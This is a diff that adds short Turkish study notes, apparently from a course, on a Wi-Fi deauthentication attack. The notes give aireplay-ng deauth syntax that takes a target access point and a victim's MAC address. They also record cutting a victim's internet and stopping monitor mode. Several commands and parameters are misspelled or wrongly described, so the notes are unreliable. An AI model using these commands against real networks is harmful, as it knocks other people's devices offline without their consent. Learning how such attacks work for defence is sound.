@@ -1,0 +1,14 @@
+deaUTHY SALDIRISI & Savunma:()de otorezition
+
+mac adresine sldır(samet abi)
+aireplay -ng --help   (--deauth,--fakeauth vb parametreleri mevcut)
+
+aireplay -ng --dauth 1000    (1000 byte gönder adam kopsun) -a (hedef yazılır(ağya modemin adresini
+yazmalıyız 22:34:43..)) -c (+victim mac adress)
+ctrl  c ile durdurabilirim.
+kesildi interneti
+tekrar bağlanacak 
+wiresharktan mac adresini almaya çalışıyoruz
+
+ifconfig wlan0mon down 
+airmon -ng stom wlan0mon
